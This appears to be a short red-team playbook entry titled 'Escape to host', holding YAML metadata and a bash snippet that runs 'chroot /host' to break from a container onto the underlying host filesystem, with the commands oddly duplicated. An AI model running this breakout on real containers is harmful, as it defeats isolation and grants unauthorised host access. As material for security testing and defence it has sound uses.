---
id: 0b8d68c3-db10-44b0-9e97-5a2565a8dd79
name: Escape to host
type: command
executor: bash
data: 'chroot /host && clear

  echo ''You are now on the underlying host''

  chroot /host && clear

  echo ''You are now on the underlying host''

  '
output: null
created_at: '2023-04-06T03:56:16.917276+00:00'
updated_at: '2023-04-10T20:33:49.704451+00:00'
---

# Escape to host

```bash
chroot /host && clear
echo 'You are now on the underlying host'
chroot /host && clear
echo 'You are now on the underlying host'

```
